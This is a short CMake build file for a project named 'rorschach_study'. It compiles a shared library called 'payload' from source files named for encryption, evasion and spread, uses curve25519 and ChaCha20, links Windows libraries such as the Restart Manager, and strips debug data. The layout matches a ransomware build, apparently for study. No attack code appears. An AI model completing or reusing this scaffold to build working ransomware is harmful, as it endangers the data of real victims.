cmake_minimum_required(VERSION 3.20)
project(rorschach_study)

set(CMAKE_CXX_STANDARD 17)

add_library(payload SHARED
    src/main.cpp
    src/crypto.cpp
    src/iocp_engine.cpp
    src/encrypt.cpp
    src/evasion.cpp
    src/spread.cpp
    src/util.cpp
    lib/curve25519.c
    lib/chacha20.c
)

target_include_directories(payload PRIVATE src lib)

target_link_libraries(payload PRIVATE
    ntdll
    advapi32
    shell32
    ole32
    shlwapi
    rstrtmgr
    netapi32
    bcrypt
)

set_target_properties(payload PROPERTIES
    LINK_FLAGS_RELEASE "/DEBUG:NONE"
)
